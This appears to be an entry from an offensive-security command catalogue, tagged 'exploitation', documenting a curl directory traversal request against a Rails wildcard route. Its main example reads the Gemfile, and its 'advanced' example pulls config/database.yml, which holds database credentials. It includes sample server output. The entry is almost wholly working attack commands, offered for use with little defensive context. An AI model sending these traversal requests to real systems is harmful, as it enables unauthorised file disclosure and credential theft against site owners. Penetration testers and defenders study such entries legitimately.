---
data: 'curl -X GET "http://localhost:3000/help/../../../Gemfile" -v'
tags:
  - http
  - exploitation
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.364Z'
id: 6d2649e6-6766-44b7-89ff-39e1f8e1e1b6
verified: false
validated: true
submitted: true
---
# curl-basic-traversal

## Command

```bash
curl -X GET "http://localhost:3000/help/../../../Gemfile" -v
```

## Description

Sends an HTTP GET request to a Rails wildcard route with directory traversal payload to disclose the Gemfile. Demonstrates basic exploitation without middleware.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X GET | HTTP method | Yes |
| URL | Target path with traversal (e.g., /help/../../../Gemfile) | Yes |
| -v | Verbose output for headers | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target/help/../../../Gemfile"
```

### Advanced Usage

```bash
curl -X GET "http://target/help/../../../config/database.yml" -o output.txt
```

## Expected Output

< HTTP/1.1 200 OK
...
source "https://rubygems.org"
gem "rails", "~> 5.0.0"
...

## Related

- [[Related Procedure]]
